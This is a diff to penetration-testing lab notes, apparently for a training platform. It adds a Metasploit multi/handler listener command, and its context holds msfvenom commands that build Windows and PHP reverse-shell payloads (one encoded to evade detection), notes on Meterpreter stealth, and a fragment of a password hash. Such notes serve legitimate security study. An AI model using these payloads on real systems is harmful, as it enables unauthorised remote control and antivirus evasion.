@@ -305,7 +305,7 @@ In all these examples, LHOST will be the IP address of your attacking machine, a
     Make sure permissions.
 - Windows  
     `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f exe > rev_shell.exe`  
-    
+
     `msfvenom -p windows/shell_reverse_tcp LHOST=CONNECTION_IP LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe`
 - PHP  
     `msfvenom -p php/meterpreter_reverse_tcp LHOST=10.10.X.X LPORT=XXXX -f raw > rev_shell.php`
@@ -387,6 +387,9 @@ $6$Sy0NNIXw$SJ27WltHI89hwM5UxqVGiXidj94QFRm2Ynp9p9kxgVbjrmtMez9EqXoDWtcQd8rf0tjc
 - Avoid being detected by network-based IPS and IDS by using encrypted communication.
 - Process(PID) is not shown as "meterpreter.exe", e.g. it's shown as "spoolsv.exe". DLLs(e.g. meterpreter.dll) isn't also shown.  
 - BUT, most antivirus software will detect Meterpreter.  
+
+### Multi Handler
+`use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run`  
 
 ### Meterpreter Flavors
 `msfvenom --list payloads | grep meterpreter`  
